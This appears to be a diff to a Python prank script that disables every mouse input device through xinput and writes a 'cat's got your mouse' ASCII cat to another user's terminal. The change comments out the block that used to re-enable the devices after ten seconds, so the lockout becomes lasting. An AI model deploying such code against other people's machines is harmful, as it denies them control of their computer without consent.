@@ -12,7 +12,7 @@ import time
 # CONSTANTS
 PASSWORD = "root"
 ASCII_CAT = """
-           X                   X              
+              X                   X              
              XXX                 XXX             
             XX XX               XX XX            
            XX   XX             XX   XX           
@@ -26,10 +26,15 @@ XXX    X                                 X    XXX
 XXX     X          X X  X X              X    XXX
          X          X    X              X        
           X                            X         
-           XXXXXXXXXXXXXXXXXXXXXXXXXXXX    
+           XXXXXXXXXXXXXXXXXXXXXXXXXXXX  
+
+==== cat's got your mouse ====
 
 """
 
+# need to run this so it can use x11 & actually run xinput properly
+# os.system("export DISPLAY=:0.0")
+os.environ["DISPLAY"] = ":0.0"
 # create ascii art file
 os.system(f'echo "{ASCII_CAT}" >> /tmp/cat.txt')
 
@@ -83,22 +88,29 @@ else:
         except Exception as e:
             print(f"error occured during disabling id {id}: {e}")
 
-    # print cat to new terminal
+    # print cat to console terminal 1 (if open)
+    target_tty = "/dev/pts/1"  # Change this if you need to target another console
     try:
-        os.system('xterm -e "bash -c \'cat /tmp/cat.txt; exec bash\'"')
-        # print(ASCII_CAT)
+        with open(target_tty, 'w') as tty_file:
+            tty_file.write(ASCII_CAT)
+            print(f"Printed ASCII art to {target_tty}")
+    except PermissionError:
+        print(f"Permission denied: Unable to write to {target_tty}")
+    except FileNotFoundError:
+        print(f"{target_tty} not found.")
     except Exception as e:
-        print(f"error with cat: {e}")
+        print(f"Error: {e}")
 
+# !!!! HAVE THIS SECTION UNCOMMENTED DURING TESTING !!!!
 
 # testing purposes only -- will sleep fo 10 seconds then repair the damage by enabling all drivers again
-time.sleep(10)
+# time.sleep(10)
 
-print("enabling mouse again")
-# disable ALL of the ids, since you dont know what the actual one is
-for id in ids:
-    try:
-        os.system(f"xinput enable {id}")
-        print(f"enabled {id}")
-    except Exception as e:
-        print(f"error occured during enabling id {id}: {e}")
+# print("enabling mouse again")
+# # enable ALL of the ids, since you dont know what the actual one is
+# for id in ids:
+#     try:
+#         os.system(f"xinput enable {id}")
+#         print(f"enabled {id}")
+#     except Exception as e:
+#         print(f"error occured during enabling id {id}: {e}")
